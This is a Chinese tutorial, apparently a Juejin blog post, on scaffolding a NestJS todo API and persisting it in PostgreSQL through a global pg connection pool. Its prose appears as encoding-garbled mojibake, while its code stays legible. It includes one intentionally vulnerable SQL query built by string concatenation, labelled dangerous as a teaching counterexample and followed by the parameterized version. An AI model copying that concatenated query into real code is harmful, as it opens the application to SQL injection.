<h3 data-id="heading-1">ä¸€ã€ç¯å¢ƒå‡†å¤‡ &amp; åˆå§‹åŒ–é¡¹ç›®</h3>
<p>ç¡®ä¿å·²å®‰è£… Node.jsï¼ˆå»ºè®® v18+ LTSï¼‰ï¼Œç„¶åå…¨å±€å®‰è£… NestJS CLIï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm install -g @nestjs/cli
</code></pre>
<p>åˆ›å»ºé¡¹ç›®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">nest new nestjs-pg-demo
</code></pre>
<p>é€‰æ‹© <code>npm</code> æˆ–ä½ å–œæ¬¢çš„åŒ…ç®¡ç†å™¨ã€‚CLI è‡ªåŠ¨ç”Ÿæˆæ ‡å‡†ç»“æ„ï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby">src/
â”œâ”€â”€ main.ts          <span class="hljs-comment"># å…¥å£æ–‡ä»¶</span>
â”œâ”€â”€ app.<span class="hljs-keyword">module</span>.ts    <span class="hljs-comment"># æ ¹æ¨¡å—</span>
â”œâ”€â”€ app.controller.ts
â””â”€â”€ app.service.ts
</code></pre>
<p>å¯åŠ¨å¼€å‘æœåŠ¡å™¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm run start:dev
</code></pre>
<p>è®¿é—® <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000" target="_blank" title="http://localhost:3000" ref="nofollow noopener noreferrer">http://localhost:3000</a> çœ‹åˆ° â€œHello Worldâ€ è¡¨ç¤ºæˆåŠŸï¼</p>
<p>ğŸ’¡ <strong>å°çŸ¥è¯†</strong>ï¼šNest é»˜è®¤ä½¿ç”¨ Express ä½œä¸ºåº•å±‚ HTTP å¼•æ“ï¼Œæ€§èƒ½è¶³å¤Ÿï¼›è‹¥è¿½æ±‚æè‡´æ€§èƒ½å¯åˆ‡æ¢ä¸º Fastifyï¼ˆé€šè¿‡ <code>@nestjs/platform-fastify</code>ï¼‰ã€‚</p>
<hr/>
<h3 data-id="heading-2">äºŒã€NestJS ä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µè¯¦è§£ï¼ˆå¿…æ‡‚ï¼ï¼‰</h3>
<p>NestJS éµå¾ªâ€œå…³æ³¨ç‚¹åˆ†ç¦»â€ï¼Œä¸‰å¤§ç»„ä»¶å„å¸å…¶èŒï¼š</p>

























<table><thead><tr><th>ç»„ä»¶</th><th>èŒè´£</th><th>ç±»æ¯”å‰ç«¯</th></tr></thead><tbody><tr><td>Module</td><td>åŠŸèƒ½æ¨¡å—å®¹å™¨ï¼Œç»„ç»‡ä»£ç å•å…ƒ</td><td>Vue ä¸­çš„æ¨¡å—åˆ’åˆ†</td></tr><tr><td>Controller</td><td>å¤„ç† HTTP è¯·æ±‚ï¼Œå®šä¹‰è·¯ç”±</td><td>è·¯ç”±æ§åˆ¶å™¨</td></tr><tr><td>Service</td><td>å°è£…ä¸šåŠ¡é€»è¾‘ï¼Œä¸å¤„ç†è¯·æ±‚</td><td>Vuex Store / Service å±‚</td></tr></tbody></table>
<h4 data-id="heading-3">âœ… ä½¿ç”¨ CLI å¿«é€Ÿç”Ÿæˆ Todo æ¨¡å—</h4>
<p>æˆ‘ä»¬æ¥åšä¸€ä¸ªç®€å•çš„ <code>todos</code> CRUD åŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">nest g module todos      <span class="hljs-comment"># ç”Ÿæˆæ¨¡å—</span>
nest g controller todos --no-spec   <span class="hljs-comment"># æ§åˆ¶å™¨ï¼ˆè·³è¿‡æµ‹è¯•ï¼‰</span>
nest g service todos --no-spec      <span class="hljs-comment"># æœåŠ¡</span>
</code></pre>
<p>è‡ªåŠ¨ç”Ÿæˆçš„ <code>todos.module.ts</code> å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/todos/todos.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Module</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TodosController</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./todos.controller'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TodosService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./todos.service'</span>;

<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">controllers</span>: [<span class="hljs-title class_">TodosController</span>],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">TodosService</span>],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TodosModule</span> {}
</code></pre>
<p>è®°å¾—åœ¨ <code>AppModule</code> ä¸­å¯¼å…¥å®ƒï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/app.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Module</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppController</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.controller'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.service'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TodosModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./todos/todos.module'</span>;

<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [<span class="hljs-title class_">TodosModule</span>], <span class="hljs-comment">// âœ… å¯¼å…¥åŠŸèƒ½æ¨¡å—</span>
  <span class="hljs-attr">controllers</span>: [<span class="hljs-title class_">AppController</span>],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">AppService</span>],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppModule</span> {}
</code></pre>
<p>ğŸ“Œ <strong>é‡ç‚¹ç†è§£</strong>ï¼š</p>
<ul>
<li><code>@Module()</code> è£…é¥°å™¨æ˜¯æ•´ä¸ªåº”ç”¨çš„â€œç»„è£…å™¨â€</li>
<li><code>imports</code>: å¼•å…¥å…¶ä»–æ¨¡å—</li>
<li><code>controllers</code>: å½“å‰æ¨¡å—æš´éœ²çš„è·¯ç”±</li>
<li><code>providers</code>: å¯è¢«æ³¨å…¥çš„æœåŠ¡ï¼ˆæ”¯æŒ DIï¼‰</li>
</ul>
<hr/>
<h3 data-id="heading-4">ä¸‰ã€å…ˆåšå†…å­˜ç‰ˆ CRUD â€”â€” å¿«é€ŸéªŒè¯æµç¨‹</h3>
<p>ä¸ºäº†å…ˆè·‘é€šé€»è¾‘ï¼Œæˆ‘ä»¬å…ˆç”¨æ•°ç»„æ¨¡æ‹Ÿæ•°æ®å­˜å‚¨ã€‚</p>
<h4 data-id="heading-5">1. å®šä¹‰æ¥å£ &amp; åˆ›å»º Service</h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/todos/todos.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>;
}

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TodosService</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">todos</span>: <span class="hljs-title class_">Todo</span>[] = [{ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'å­¦ä¹  NestJS'</span>, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> }];
  <span class="hljs-keyword">private</span> idCounter = <span class="hljs-number">2</span>;

  <span class="hljs-title function_">findAll</span>(): <span class="hljs-title class_">Todo</span>[] {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>;
  }

  <span class="hljs-title function_">create</span>(<span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Todo</span> {
    <span class="hljs-keyword">const</span> todo = { <span class="hljs-attr">id</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">idCounter</span>++, title, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">push</span>(todo);
    <span class="hljs-keyword">return</span> todo;
  }

  <span class="hljs-title function_">delete</span>(<span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">id</span> === id);
    <span class="hljs-keyword">if</span> (index === -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
}
</code></pre>
<p>ğŸ“Œ <code>@Injectable()</code> æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<blockquote>
<p>å®ƒæ ‡è®°è¿™ä¸ªç±»å¯ä»¥è¢« Nest çš„ä¾èµ–æ³¨å…¥ç³»ç»Ÿç®¡ç†ã€‚å³ä½¿æ²¡æ˜¾å¼å†™ <code>@Injectable()</code>ï¼Œåªè¦è¢«æ¨¡å—å¼•ç”¨ä¹Ÿèƒ½å·¥ä½œï¼Œä½†åŠ ä¸Šæ›´è§„èŒƒï¼Œå°¤å…¶å½“ä½ éœ€è¦ç”¨åˆ°æ³¨å…¥å…¶ä»–æœåŠ¡æ—¶ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-6">2. ç¼–å†™ Controller æ¥æ”¶è¯·æ±‚</h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/todos/todos.controller.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Controller</span>, <span class="hljs-title class_">Get</span>, <span class="hljs-title class_">Post</span>, <span class="hljs-title class_">Body</span>, <span class="hljs-title class_">Delete</span>, <span class="hljs-title class_">Param</span>, <span class="hljs-title class_">ParseIntPipe</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TodosService</span>, <span class="hljs-title class_">Todo</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./todos.service'</span>;

<span class="hljs-meta">@Controller</span>(<span class="hljs-string">'todos'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TodosController</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> todosService: TodosService</span>) {}

  <span class="hljs-meta">@Get</span>()
  <span class="hljs-title function_">getAll</span>(): <span class="hljs-title class_">Todo</span>[] {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">todosService</span>.<span class="hljs-title function_">findAll</span>();
  }

  <span class="hljs-meta">@Post</span>()
  <span class="hljs-title function_">add</span>(<span class="hljs-meta">@Body</span>(<span class="hljs-string">'title'</span>) <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Todo</span> {
    <span class="hljs-keyword">if</span> (!title?.<span class="hljs-title function_">trim</span>()) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'æ ‡é¢˜ä¸èƒ½ä¸ºç©º'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">todosService</span>.<span class="hljs-title function_">create</span>(title);
  }

  <span class="hljs-meta">@Delete</span>(<span class="hljs-string">':id'</span>)
  <span class="hljs-title function_">remove</span>(<span class="hljs-params"><span class="hljs-meta">@Param</span>(<span class="hljs-string">'id'</span>, ParseIntPipe) id: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">todosService</span>.<span class="hljs-title function_">delete</span>(id) };
  }
}
</code></pre>
<p>ğŸ¯ å…³é”®è¯­æ³•è§£æï¼š</p>





























<table><thead><tr><th>è£…é¥°å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><code>@Controller('todos')</code></td><td>å®šä¹‰åŸºç¡€è·¯å¾„ <code>/todos</code></td></tr><tr><td><code>@Get()</code> â†’ <code>GET /todos</code></td><td>è·å–åˆ—è¡¨</td></tr><tr><td><code>@Post()</code> â†’ <code>POST /todos</code></td><td>æ·»åŠ ä»»åŠ¡</td></tr><tr><td><code>@Body('title')</code></td><td>æå– JSON è¯·æ±‚ä½“ä¸­çš„å­—æ®µ</td></tr><tr><td><code>@Param('id', ParseIntPipe)</code></td><td>è‡ªåŠ¨å°† URL å‚æ•°è½¬æˆæ•´æ•°ï¼Œå¤±è´¥æŠ›é”™</td></tr></tbody></table>
<p>ğŸ§  <strong>ParseIntPipe å¹²äº†å•¥ï¼Ÿ</strong></p>
<blockquote>
<p>åŸç”Ÿ Node ä¸­ <code>req.params.id</code> æ˜¯å­—ç¬¦ä¸² <code>'1'</code>ï¼Œä½ éœ€è¦æ‰‹åŠ¨ <code>parseInt</code>ã€‚è€Œ <code>ParseIntPipe</code> ä¼šè‡ªåŠ¨è½¬æ¢ï¼Œå¹¶åœ¨æ ¡éªŒå¤±è´¥æ—¶è¿”å› 400 é”™è¯¯ï¼Œæå‡å¥å£®æ€§ï¼</p>
</blockquote>
<hr/>
<h3 data-id="heading-7">å››ã€æ¥å…¥ PostgreSQLï¼šå‘Šåˆ«å†…å­˜ï¼Œèµ°å‘ç”Ÿäº§</h3>
<p>ç°åœ¨æˆ‘ä»¬å°†æ•°æ®æŒä¹…åŒ–åˆ° PostgreSQLã€‚</p>
<h4 data-id="heading-8">1. å®‰è£…ä¾èµ–</h4>
<pre><code class="hljs language-bash" lang="bash">npm install pg dotenv
npm install -D @types/pg
</code></pre>
<h4 data-id="heading-9">2. é…ç½®ç¯å¢ƒå˜é‡ <code>.env</code></h4>
<pre><code class="hljs language-env" lang="env">DB_HOST=localhost
DB_PORT=5432
DB_USER=your_user
DB_PASSWORD=your_password
DB_NAME=nest_demo
PORT=3000
</code></pre>
<p>åœ¨ <code>main.ts</code> å¼€å¤´åŠ è½½é…ç½®ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/main.ts</span>
<span class="hljs-keyword">import</span> { config } <span class="hljs-keyword">from</span> <span class="hljs-string">'dotenv'</span>;
<span class="hljs-title function_">config</span>(); <span class="hljs-comment">// åŠ è½½ .env æ–‡ä»¶</span>

<span class="hljs-keyword">import</span> { <span class="hljs-title class_">NestFactory</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/core'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.module'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-keyword">await</span> <span class="hljs-title class_">NestFactory</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">AppModule</span>);
  <span class="hljs-keyword">await</span> app.<span class="hljs-title function_">listen</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3000</span>);
}
<span class="hljs-title function_">bootstrap</span>();
</code></pre>
<hr/>
<h4 data-id="heading-10">3. å°è£… DatabaseModuleï¼ˆæ¨èåšæ³•ï¼‰</h4>
<p>æˆ‘ä»¬è¦æŠŠæ•°æ®åº“è¿æ¥åšæˆä¸€ä¸ª<strong>å…¨å±€å…±äº«çš„è¿æ¥æ± </strong>ï¼Œé¿å…é‡å¤åˆ›å»ºã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/database/database.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Global</span>, <span class="hljs-title class_">Module</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Pool</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'pg'</span>;

<span class="hljs-meta">@Global</span>() <span class="hljs-comment">// ğŸŒ æ ‡è®°ä¸ºå…¨å±€æ¨¡å—ï¼Œå…¶ä»–æ¨¡å—æ— éœ€å† import</span>
<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">providers</span>: [
    {
      <span class="hljs-attr">provide</span>: <span class="hljs-string">'PG_CONNECTION'</span>, <span class="hljs-comment">// è‡ªå®šä¹‰ä»¤ç‰Œå</span>
      <span class="hljs-attr">useValue</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pool</span>({
        <span class="hljs-attr">user</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">DB_USER</span>,
        <span class="hljs-attr">host</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">DB_HOST</span>,
        <span class="hljs-attr">database</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">DB_NAME</span>,
        <span class="hljs-attr">password</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">DB_PASSWORD</span>,
        <span class="hljs-attr">port</span>: <span class="hljs-built_in">parseInt</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">DB_PORT</span>, <span class="hljs-number">10</span>),
      }),
    },
  ],
  <span class="hljs-attr">exports</span>: [<span class="hljs-string">'PG_CONNECTION'</span>], <span class="hljs-comment">// âš ï¸ è®©å¤–éƒ¨èƒ½æ‹¿åˆ°è¿™ä¸ªè¿æ¥</span>
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseModule</span> {}
</code></pre>
<p>ğŸ“Œ <strong>ä¸ºä»€ä¹ˆç”¨ <code>@Global()</code>ï¼Ÿ</strong></p>
<blockquote>
<p>å¦‚æœä½ ä¸åŠ ï¼Œæ¯ä¸ªéœ€è¦æ•°æ®åº“çš„æ¨¡å—éƒ½å¾—æ‰‹åŠ¨å¯¼å…¥ <code>DatabaseModule</code>ï¼Œå¾ˆéº»çƒ¦ã€‚åŠ ä¸Šååªéœ€ä¸€æ¬¡æ³¨å†Œï¼Œå¤„å¤„å¯ç”¨ã€‚</p>
</blockquote>
<p>åˆ«å¿˜äº†åœ¨ <code>AppModule</code> ä¸­å¼•å…¥ä¸€æ¬¡ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/app.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">DatabaseModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./database/database.module'</span>;

<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [<span class="hljs-title class_">DatabaseModule</span>, <span class="hljs-title class_">TodosModule</span>],
  <span class="hljs-attr">controllers</span>: [<span class="hljs-title class_">AppController</span>],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">AppService</span>],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppModule</span> {}
</code></pre>
<hr/>
<h4 data-id="heading-11">4. æ”¹é€  TodosService ä½¿ç”¨ PG æŸ¥è¯¢</h4>
<p>å…ˆåœ¨æ•°æ®åº“ä¸­å»ºè¡¨ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> todos (
  id SERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
  title <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  completed <span class="hljs-type">BOOLEAN</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-literal">false</span>
);
</code></pre>
<p>ç„¶åæ”¹é€ æœåŠ¡å±‚ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/todos/todos.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span>, <span class="hljs-title class_">Inject</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TodosService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-meta">@Inject</span>(<span class="hljs-string">'PG_CONNECTION'</span>) <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> db: Pool</span>) {}

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">findAll</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">query</span>(<span class="hljs-string">'SELECT * FROM todos ORDER BY id'</span>);
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">rows</span>; <span class="hljs-comment">// è¿”å›ç»“æœæ•°ç»„</span>
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">title: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">query</span>(
      <span class="hljs-string">'INSERT INTO todos (title) VALUES ($1) RETURNING *'</span>,
      [title]
    );
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">rows</span>[<span class="hljs-number">0</span>];
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">query</span>(<span class="hljs-string">'DELETE FROM todos WHERE id = $1'</span>, [id]);
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">rowCount</span> &gt; <span class="hljs-number">0</span>; <span class="hljs-comment">// æ˜¯å¦æœ‰è¡Œè¢«åˆ é™¤</span>
  }
}
</code></pre>
<p>ğŸ”‘ <strong>é‡ç‚¹æ¥äº†ï¼šSQL æ³¨å…¥é˜²æŠ¤ï¼</strong></p>
<p>âŒ é”™è¯¯å†™æ³•ï¼ˆæ‹¼æ¥ SQLï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">db.<span class="hljs-title function_">query</span>(<span class="hljs-string">`DELETE FROM todos WHERE id = <span class="hljs-subst">${id}</span>`</span>); <span class="hljs-comment">// å±é™©ï¼å¯èƒ½è¢«æ³¨å…¥</span>
</code></pre>
<p>âœ… æ­£ç¡®åšæ³•ï¼ˆå‚æ•°åŒ–æŸ¥è¯¢ï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">db.<span class="hljs-title function_">query</span>(<span class="hljs-string">'DELETE FROM todos WHERE id = $1'</span>, [id]); <span class="hljs-comment">// å®‰å…¨ âœ”ï¸</span>
</code></pre>
<blockquote>
<p><code>$1</code>, <code>$2</code> æ˜¯ PostgreSQL å ä½ç¬¦ï¼Œé…åˆå‚æ•°æ•°ç»„ä½¿ç”¨ï¼Œä»æ ¹æœ¬ä¸Šé˜²æ­¢ SQL æ³¨å…¥æ”»å‡»ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-12">5. æ·»åŠ æ•°æ®åº“å¥åº·æ£€æŸ¥æ¥å£</h4>
<p>æ–¹ä¾¿è°ƒè¯•è¿æ¥æ˜¯å¦æ­£å¸¸ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/app.controller.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Controller</span>, <span class="hljs-title class_">Get</span>, <span class="hljs-title class_">Inject</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;

<span class="hljs-meta">@Controller</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppController</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-meta">@Inject</span>(<span class="hljs-string">'PG_CONNECTION'</span>) <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> db: <span class="hljs-built_in">any</span></span>) {}

  <span class="hljs-meta">@Get</span>(<span class="hljs-string">'db-test'</span>)
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">testDb</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">query</span>(<span class="hljs-string">'SELECT 1'</span>);
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">status</span>: <span class="hljs-string">'âœ… æ•°æ®åº“è¿æ¥æˆåŠŸï¼'</span> };
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">status</span>: <span class="hljs-string">'âŒ è¿æ¥å¤±è´¥'</span>, <span class="hljs-attr">error</span>: err.<span class="hljs-property">message</span> };
    }
  }
}
</code></pre>
<p>è®¿é—® <code>/db-test</code> å³å¯çœ‹åˆ°è¿æ¥çŠ¶æ€ã€‚</p>
<hr/>
<h3 data-id="heading-13">äº”ã€æ€»ç»“ &amp; ä¸‹ä¸€æ­¥è¿›é˜¶å»ºè®®ï¼ˆå†²æ¦œåŠ åˆ†é¡¹ï¼ï¼‰</h3>
<p>ä½ å·²ç»å®Œæˆäº†ä»¥ä¸‹å…³é”®èƒ½åŠ›æ„å»ºï¼š</p>
<p>âœ… æ­å»º NestJS å·¥ç¨‹éª¨æ¶<br/>
âœ… ç†è§£æ¨¡å—åŒ–æ¶æ„è®¾è®¡<br/>
âœ… å®ç°ä¾èµ–æ³¨å…¥ä¸å…¨å±€æ¨¡å—å°è£…<br/>
âœ… å®‰å…¨åœ°æ“ä½œ PostgreSQL æ•°æ®åº“<br/>
âœ… æŒæ¡è£…é¥°å™¨ã€ç®¡é“ã€å‚æ•°åŒ–æŸ¥è¯¢ç­‰æ ¸å¿ƒè¯­æ³•</p>
<hr/>
<h4 data-id="heading-14">ğŸš€ æ˜é‡‘è¯»è€…å…³å¿ƒçš„â€œä¸‹ä¸€æ­¥æ€ä¹ˆåšâ€ï¼Ÿ</h4>





























<table><thead><tr><th>ç›®æ ‡</th><th>æ¨èæ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>æ›´é«˜æ•ˆå†™æ•°æ®åº“</td><td>ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Ftypeorm.io%2F" target="_blank" title="https://typeorm.io/" ref="nofollow noopener noreferrer">TypeORM</a> æˆ– <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.prisma.io%2F" target="_blank" title="https://www.prisma.io/" ref="nofollow noopener noreferrer">Prisma</a>ï¼Œå‘Šåˆ«æ‰‹å†™ SQL</td></tr><tr><td>è¯·æ±‚æ ¡éªŒè‡ªåŠ¨åŒ–</td><td>å¼•å…¥ <code>class-validator</code> + <code>ValidationPipe</code>ï¼Œè‡ªåŠ¨æ‹¦æˆªéæ³•è¾“å…¥</td></tr><tr><td>ç»Ÿä¸€é”™è¯¯å“åº”</td><td>ä½¿ç”¨ <code>@UseFilters()</code> + <code>HttpExceptionFilter</code> å…¨å±€æ•è·å¼‚å¸¸</td></tr><tr><td>è‡ªåŠ¨ç”Ÿæˆæ–‡æ¡£</td><td>é›†æˆ <code>@nestjs/swagger</code>ï¼Œä¸€é”®ç”Ÿæˆ API æ–‡æ¡£é¡µé¢</td></tr><tr><td>æå‡å¼€å‘ä½“éªŒ</td><td>ä½¿ç”¨ DTO åˆ†ç¦»æ•°æ®ä¼ è¾“å¯¹è±¡ï¼Œå¢å¼ºç±»å‹æç¤º</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-15">ğŸ’¬ æœ€åè¯´ä¸€å¥çœŸå¿ƒè¯</h4>
<blockquote>
<p><strong>NestJS ä¸åªæ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œæ›´æ˜¯ä¸€ç§ç¼–ç¨‹æ€ç»´çš„å‡çº§ã€‚</strong></p>
</blockquote>
<p>å½“ä½ å¼€å§‹ç”¨â€œæ¨¡å—â€ç»„ç»‡åŠŸèƒ½ã€â€œæœåŠ¡â€å°è£…é€»è¾‘ã€â€œæ³¨å…¥â€ç®¡ç†ä¾èµ–æ—¶ï¼Œä½ å°±å·²ç»è„±ç¦»äº†â€œè„šæœ¬å°å­â€çš„é˜¶æ®µï¼Œè¿ˆå‘çœŸæ­£çš„<strong>å·¥ç¨‹åŒ–å¼€å‘</strong>ã€‚</p>
